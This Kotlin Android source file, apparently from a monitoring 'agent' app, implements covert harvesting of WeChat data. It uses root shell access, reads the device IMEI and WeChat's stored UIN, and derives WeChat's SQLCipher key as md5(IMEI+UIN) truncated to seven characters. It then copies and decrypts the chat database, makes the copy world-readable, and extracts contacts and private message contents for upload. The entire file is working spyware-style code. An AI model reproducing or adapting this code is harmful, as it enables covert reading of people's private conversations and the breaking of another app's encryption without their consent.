package cn.xzj.agent.util

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Context.TELEPHONY_SERVICE
import android.content.pm.PackageManager
import android.os.Build
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.util.Log
import android.util.Xml
import cn.xzj.agent.constants.Constants.*
import cn.xzj.agent.constants.EnumValue
import cn.xzj.agent.constants.Keys
import cn.xzj.agent.entity.privacy.WeChatRecordInfo
import cn.xzj.agent.entity.privacy.WechatContactInfo
import cn.xzj.agent.i.DBFileInitSuccessListener
import cn.xzj.agent.i.DBInitSuccessListener
import cn.xzj.agent.i.OnCmdExecSuccessListener
import com.channey.utils.FormatUtils
import com.channey.utils.SharedPreferencesUtils
import com.channey.utils.StringUtils
import net.sqlcipher.Cursor
import net.sqlcipher.database.SQLiteDatabase
import net.sqlcipher.database.SQLiteDatabaseHook
import org.xmlpull.v1.XmlPullParser
import java.io.*
import java.security.MessageDigest

class WxMonitorUtils {
    companion object {

        /**
         * 获取imei
         */
        fun getIMEI(context: Activity): String {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val permissionCheck = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
//                val selfPermission = context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                if (permissionCheck != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(context, arrayOf(Manifest.permission.READ_PHONE_STATE), 1)
                }
            }
            val tm = context.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            //兼容模拟器
            val deviceId = if (tm.deviceId == null) "00:00:00:00:00:00" else tm.deviceId

            SharedPreferencesUtils.saveString(context, cn.xzj.agent.constants.Keys.IMEI, deviceId, Activity.MODE_MULTI_PROCESS)
            return deviceId
        }

        /**
         * 执行linux指令
         *
         * @param paramString
         * @param listener 命令执行完成后回调接口
         */
        fun execCmd(paramString: String, listener: OnCmdExecSuccessListener) {
            Thread(Runnable {
                try {
                    val localProcess = Runtime.getRuntime().exec("su")
                    var localObject: Any = localProcess.outputStream
                    val localDataOutputStream = DataOutputStream(localObject as OutputStream)
                    localObject = paramString + "\n"
                    localDataOutputStream.writeBytes(localObject)
                    localDataOutputStream.flush()
                    localDataOutputStream.writeBytes("exit\n")
                    localDataOutputStream.flush()
                    val waitFor = localProcess.waitFor()
                    localObject = localProcess.exitValue()
//                    Log.d("qian","################# execCmd #################localObject=$localObject")
                    if (localObject == 0) listener.onSuccess() else listener.onFailure()
                } catch (localException: Exception) {
                    listener.onFailure()
                    localException.printStackTrace()
                } catch (ioException: IOException) {
                    listener.onFailure()
                    ioException.printStackTrace()
                }
            }).start()

        }

        /**
         * 获取微信的uid
         * 微信的uid存储在SharedPreferences里面
         * 存储位置\data\data\com.tencent.mm\shared_prefs\auth_info_key_prefs.xml
         */
        fun getWxUin(context: Context): String {
            var uin = ""
            val file = File(WX_SP_UIN_PATH)
            try {
                val `in` = FileInputStream(file)
//                val saxReader = SAXReader()
//                val document = saxReader.read(`in`)
//                val root = document.getRootElement()
//                val elements = root.elements()
//                for (element in elements) {
//                    if ("_auth_uin" == element.attributeValue("name")) {
//                        uin = element.attributeValue("value")
//                    }
//                }
                uin = getUinFromXml(`in`)
            } catch (e: Exception) {
                e.printStackTrace()
                Log.d("qian", "获取微信uid失败，请检查auth_info_key_prefs文件权限")
            }
            if (!StringUtils.isEmpty(uin)) {
                SharedPreferencesUtils.saveString(context, Keys.UIN, uin, Activity.MODE_MULTI_PROCESS)
            }
            return uin
        }

        private fun getUinFromXml(`is`: InputStream): String {
            var uin = ""
            val parser = Xml.newPullParser()
            parser.setInput(`is`, "utf-8")
            var type = parser.eventType
            while (type != XmlPullParser.END_DOCUMENT) {
                if (!TextUtils.isEmpty(parser.name) && "int".equals(parser.name)) {
                    if (type === XmlPullParser.START_TAG) {
                        var key = parser.getAttributeValue(null, "name")
                        if ("_auth_uin".equals(key)) {
                            uin = parser.getAttributeValue(null, "value")
//                            Log.d("qian","attributeValue = "+uin)
                            break
                        }
                    }
                }
                type = parser.next()//读取下一个标签
            }
            return uin
        }

        /**
         *
         */
        open fun getValueFromPref(filePath: String,key:String):String?{
            var value:String ?= null
            try {
                var file = File(filePath)
                val fis = FileInputStream(file)
                val parser = Xml.newPullParser()
                parser.setInput(fis, "utf-8")
                var type = parser.eventType
                while (type != XmlPullParser.END_DOCUMENT) {
                    if (!TextUtils.isEmpty(parser.name)) {
                        if (type === XmlPullParser.START_TAG) {
                            var key1 = parser.getAttributeValue(null, "name")
                            if (key == key1) {
                                value = parser.getAttributeValue(null, "value")
                                if (value == null){
                                    value = parser.nextText()
                                }
                                break
                            }
                        }
                    }
                    type = parser.next()//读取下一个标签
                }
            }catch (e:Exception){
                e.printStackTrace()
            }
            return value
        }

        /**
         * 根据imei和uin生成的md5码，获取数据库的密码（去前七位的小写字母）
         *
         * @param imei
         * @param uin
         * @return
         */
        fun initDbPassword(imei: String, uin: String): String? {

            if (TextUtils.isEmpty(imei) || TextUtils.isEmpty(uin)) {
                Log.d("qian", "初始化数据库密码失败：imei或uid为空")
                return null
            }
            val md5 = md5(imei + uin)
            val password = md5!!.substring(0, 7).toLowerCase()
            return password
        }

        /**
         * md5加密
         *
         * @param content
         * @return
         */
        fun md5(content: String): String? {
            var md5: MessageDigest? = null
            try {
                md5 = MessageDigest.getInstance("MD5")
                md5!!.update(content.toByteArray(charset("UTF-8")))
                val encryption = md5!!.digest()//加密
                val sb = StringBuffer()
                for (i in encryption.indices) {
                    if (Integer.toHexString(0xff and encryption[i].toInt()).length == 1) {
                        sb.append("0").append(Integer.toHexString(0xff and encryption[i].toInt()))
                    } else {
                        sb.append(Integer.toHexString(0xff and encryption[i].toInt()))
                    }
                }
                return sb.toString()
            } catch (e: Exception) {
                e.printStackTrace()
                return null
            }

        }


        /**
         * 递归查询微信本地数据库文件
         *
         * @param file     目录
         * @param fileName 需要查找的文件名称
         */
        fun searchFile(file: File, fileName: String) {
            if (file.isDirectory) {
                val files = file.listFiles()
                if (files != null) {
                    for (childFile in files) {
                        searchFile(childFile, fileName)
                    }
                }
            } else {
                if (fileName == file.name) {
                    mWxDbPathList.add(file)
                }
            }
        }


        /**
         * 复制单个文件
         *
         * @param oldPath String 原文件路径 如：c:/fqf.txt
         * @param newPath String 复制后路径 如：f:/fqf.txt
         * @return boolean
         */
        fun copyFile(oldPath: String, newPath: String, listener: DBFileInitSuccessListener) {
            try {
                var byteRead = 0
                val oldFile = File(oldPath)
                val newFile = File(newPath)
                if (newFile.exists()) newFile.delete()
                if (oldFile.exists()) { //文件存在时
                    val inStream = FileInputStream(oldPath) //读入原文件
                    val fs = FileOutputStream(newPath)
                    val buffer = ByteArray(1444)
                    byteRead = inStream.read(buffer)
                    while (byteRead != -1) {
                        fs.write(buffer, 0, byteRead)
                        byteRead = inStream.read(buffer)
                    }
                    inStream.close()
                    Runtime.getRuntime().exec("chmod 777 $newPath");
                    listener.onSuccess()
                }
            } catch (e: Exception) {
                println("复制单个文件操作出错")
                e.printStackTrace()

            }

        }

        open fun openDB(context: Context, dbPath: String, pwd: String): SQLiteDatabase? {
            SQLiteDatabase.loadLibs(context)
            val hook = object : SQLiteDatabaseHook {
                override fun preKey(database: SQLiteDatabase) {}

                override fun postKey(database: SQLiteDatabase) {
                    database.rawExecSQL("PRAGMA cipher_migrate;") //兼容2.0的数据库
                }
            }

            var dbFile = File(dbPath)
            if (!dbFile.exists()) {
                throw Exception("db file not exist")
            }

            //有下面2个文件会二次加载db错误
            var pkg = context.packageName
            var dbFileShm = File("/data/data/$pkg/$COPY_WX_DATA_DB-shm")
            var dbFileWal = File("/data/data/$pkg/$COPY_WX_DATA_DB-wal")
            if (dbFileShm.exists()) dbFileShm.delete()
            if (dbFileWal.exists()) dbFileWal.delete()
            var db: SQLiteDatabase? = null
            try {
                //打开数据库连接
                db = SQLiteDatabase.openOrCreateDatabase(dbFile, pwd, null, hook)
            } catch (e: Exception) {
                Log.d("qian", "读取数据库信息失败$e")
            }
            return db
        }

        open fun openDB(context: Context, dbPath: String, pwd: String, listener: DBInitSuccessListener): SQLiteDatabase? {
            SQLiteDatabase.loadLibs(context)
            val hook = object : SQLiteDatabaseHook {
                override fun preKey(database: SQLiteDatabase) {}

                override fun postKey(database: SQLiteDatabase) {
                    database.rawExecSQL("PRAGMA cipher_migrate;") //兼容2.0的数据库
                }
            }

            var dbFile = File(dbPath)
            if (!dbFile.exists()) {
                throw Exception("db file $dbPath not exist")
            }

            //有下面2个文件会二次加载db错误
//            var pkg = context.packageName
//            var dbFileShm = File("/data/data/$pkg/$COPY_WX_DATA_DB-shm")
//            var dbFileWal = File("/data/data/$pkg/$COPY_WX_DATA_DB-wal")
//            if (dbFileShm.exists()) dbFileShm.delete()
//            if (dbFileWal.exists()) dbFileWal.delete()
//            Log.d("qian","***************** 数据库密码为 $pwd")
            var db: SQLiteDatabase? = null
            try {
                //打开数据库连接
                db = SQLiteDatabase.openOrCreateDatabase(dbFile, pwd, null, hook)
                listener.onSuccess(db)
            } catch (e: Exception) {
                e.printStackTrace()
                Log.d("qian", "读取数据库信息失败$e")
            }
            return db
        }

        /**
         * 获取联系人
         * @param context
         * @param dbPath
         * @param pwd
         */
        fun getContacts(dbBase: SQLiteDatabase): List<WechatContactInfo> {
            val list = ArrayList<WechatContactInfo>()

            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
            var c1 = dbBase.rawQuery("select * from rcontact where verifyFlag = 0 and type != 4 and type != 2 and type != 33 and type != 0", null)
            if (c1.moveToFirst()) {
                do {
                    try {
                        val userName = c1.getString(c1.getColumnIndex("username"))
                        val alias = c1.getString(c1.getColumnIndex("alias"))
                        val nickName = c1.getString(c1.getColumnIndex("nickname"))
                        val deleteFlag = c1.getString(c1.getColumnIndex("deleteFlag"))
//                    Log.d("qian","\nusername:$userName,alias:$alias,nickname:$nickName,deleteFlag:$deleteFlag")
                        list.add(WechatContactInfo(userName, alias, nickName))
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }

                } while (c1.moveToNext())
            }
            c1.close()

            return list
        }

        /**
         * 获取聊天记录
         * @param dbBase
         * @param fastDate fastDate 查询的起始时间点
         * */
        fun getWeChatRecords(context: Context, fastDate: Long, dbBase: SQLiteDatabase): List<WeChatRecordInfo> {
            var list = ArrayList<WeChatRecordInfo>()
            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
//            val c = dbBase.query("message", null, null, null, null, null, null)
//            var sql = StringBuilder("select * from message where status != 3 ")
            var sql = StringBuilder("select * from message ")
            var selection: String? = null
            if (fastDate > 0) {
                var date = FormatUtils.timeStamp2String(System.currentTimeMillis(), EnumValue.DATE_FORMAT_3)
                var to = FormatUtils.string2TimeStamp(EnumValue.DATE_FORMAT_4, "$date 23:59:59").toString()
                selection = "createTime Between $fastDate and $to"
            } else {

                val alreadyUploadRecords = SharedPreferencesUtils.getBoolean(context, Keys.ALREADY_UPLOAD_WECHAT_RECORDS, Activity.MODE_MULTI_PROCESS)
                if (alreadyUploadRecords!!) {
                    var date = FormatUtils.timeStamp2String(System.currentTimeMillis(), EnumValue.DATE_FORMAT_3)
                    var from = FormatUtils.string2TimeStamp(EnumValue.DATE_FORMAT_4, "$date 00:00:00").toString()
                    var to = FormatUtils.string2TimeStamp(EnumValue.DATE_FORMAT_4, "$date 23:59:59").toString()
                    selection = "createTime Between $from and $to"
                }
            }

            if (selection != null) {
                sql.append(" where ")
                sql.append(selection)
            }
//            Log.d("qian","\n#######################################微信聊天记录################################ $sql")
            val c = dbBase.rawQuery(sql.toString(), null)
            if (c.moveToFirst()) {
                do {
                    try {
                        val talker = c.getString(c.getColumnIndex("talker"))
                        val chatRoomTalk = talker.contains("@chatroom")
                        if (!chatRoomTalk && isTheTalkerWeWants(talker)) { //聊天群的记录不采集
                            val status = c.getString(c.getColumnIndex("status"))
                            val createTime = c.getString(c.getColumnIndex("createTime"))
                            val content = c.getString(c.getColumnIndex("content"))
                            val send = c.getString(c.getColumnIndex("isSend"))
                            val type = c.getString(c.getColumnIndex("type"))
                            var info = WeChatRecordInfo(type = type, status = status, send = send, sendTime = createTime, talker = talker, content = content)
//                        Log.i("qian", "微信聊天记录 ${info.toString()}")
                            list.add(info)
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }

                } while (c.moveToNext())
            }
            c.close()
            return list
        }

        /**
         * 微信信息采集时，符合该条件的数据不采集
         * @param talker
         */
        private fun isTheTalkerWeWants(talker: String): Boolean {
            if (talker == "weixin") {
                return false
            }
            return true
        }

        const val systemInfoFileName = "systemInfo.cfg"
        const val compatibleInfoFileName = "CompatibleInfo.cfg"

        fun getCfgInfo(filePath: String): String {
            var fis: FileInputStream? = null
            try {
                fis = FileInputStream(filePath)
                val os = ObjectInputStream(fis)
                val readObject = os.readObject() as HashMap<Int, Any>
//                for (key in readObject.keys) {
//                    val value = readObject[key]
//                    Log.d("qian", "key = " + key + " , value = " + value.toString())
//                }
                //get imei
                if (filePath.contains(compatibleInfoFileName)) {
                    return readObject.get(258).toString()
                }
                //get uin
                else if (filePath.contains(systemInfoFileName)) {
                    var uin = readObject.get(1).toString()
                    return uin
                }
            } catch (e: FileNotFoundException) {
                e.printStackTrace()
            } catch (e: EOFException) {
                e.printStackTrace()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: ClassNotFoundException) {
                e.printStackTrace()
            } finally {

            }
            return ""
        }
    }
}